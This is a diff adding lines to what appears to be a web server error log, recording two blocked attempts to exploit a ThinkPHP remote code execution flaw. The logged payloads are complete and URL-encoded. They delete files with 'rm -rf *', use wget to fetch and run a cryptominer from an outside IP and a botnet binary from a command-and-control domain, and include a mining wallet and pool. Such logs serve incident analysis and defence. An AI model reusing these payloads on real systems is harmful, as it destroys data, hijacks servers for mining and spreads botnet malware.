@@ -1,0 +1,6 @@
+[ 2018-12-18T13:57:32+08:00 ] 195.231.1.86 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=rm%20-rf%20*;%20mkdir%20css;%20wget%20http://209.141.35.236/index.html%20-O%20index.php;%20cp%20index.php%20index.html;%20cd%20css;%20wget%20http://209.141.35.236/css/style.css;%20cd%20/tmp;%20wget%20http://209.141.35.236/seul;%20chmod%20777%20seul;%20./seul%20-u%2042bWPQcq5RBhGSkyhsonFgQJPYqkE6YhVPBcwENMXrPdZskLg2ZBiXoVjqFBT7ReB5EVRN82kJ4CF3j16m1RYir2DUNgbg3%20-o%2045.32.223.48:5555%20-p%20x%20-k%20-a%20cryptonight%20-B%20--max-cpu-usage=90
+ERR: 非法操作:\think\app
+
+[ 2018-12-18T15:07:57+08:00 ] 195.231.1.14 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://cnc.arm7plz.xyz/bins/set.x86%20-O%20/tmp/.gayboi;%20chmod%20777%20/tmp/.gayboi;%20/tmp/.gayboi%20thinkphp.x86
+ERR: 非法操作:\think\app
+
